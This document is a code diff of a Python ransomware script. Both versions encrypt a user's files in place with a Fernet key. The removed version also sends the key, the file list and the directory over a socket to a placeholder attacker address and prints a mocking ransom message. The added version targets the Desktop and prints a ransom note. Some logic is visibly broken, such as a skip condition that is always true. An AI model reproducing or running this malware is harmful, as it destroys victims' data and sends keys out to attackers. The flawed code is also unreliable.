@@ -1,36 +1,44 @@
-import subprocess
-import sys
+from cryptography.fernet import Fernet
 import os
-import socket
-try:
-    from cryptography.fernet import Fernet
-except ImportError:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
-    from cryptography.fernet import Fernet
+import platform
+import getpass
 
-key = Fernet.generate_key()
-files = []
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-directory = os.getcwd()
+username = getpass.getuser()
 
-for i in os.listdir():
+operating = platform.system()
 
-    full_path = os.path.join(directory, i)
+if operating == "linux":
+    os.chdir("~/Desktop")
+elif operating == "windows":
+    os.chdir(f"C:/Users/{username}/Desktop")
 
-    if os.path.isdir(full_path):
+key = Fernet.generate_key()     # create a fernet key
+print(key)      # print it (for saftey backup)
+f = Fernet(key)         # generate an item "f"
+with open("key.key", "wb") as keyw:     #create a key file (for decryption backup)
+    keyw.write(key)
+files = []          # files list
+
+
+for file in os.listdir():               # look trough all of the files in the current directory
+
+    if file == "ransomware.py" or "key.key":        #check if the filename is the ransomware script or the key
         continue
-    else:
-        files.append(i)
-    with open(i, "rb") as f:
-        things = f.read()
+                                                    
+    if os.path.isdir(file):             # if its a directory skip it
+        continue
 
-        f = Fernet(key)
-        encrypted = f.encrypt(things)
-    with open(i, "wb") as f:
-        f.write(encrypted)
-s.connect("YOUR IP", 53)
-s.send(f"Key: {key}. Encrypted files: {files}. Directory : {directory}")
-s.close()
-print(f'Dear moron.\n You ran a ransomware virus on your machine.\n All of your files are encrypted.\n Good luck!')
-print(f'Encrypted files: {files}')
-print(f"key : {key}")
+    else:
+        files.append(file)              #if its a file append it to the files list
+
+for file in files:                  # go trough each file
+
+    with open(file, "rb") as text:          # read the data in binary
+        data = text.read()
+
+    enc_data = f.encrypt(data)          # create an encrypted version
+
+    with open(file, "wb") as text:      # replace the file content with encrypted version
+        text.write(enc_data)
+
+print("Your files have been encrypted!")        #display ransom note
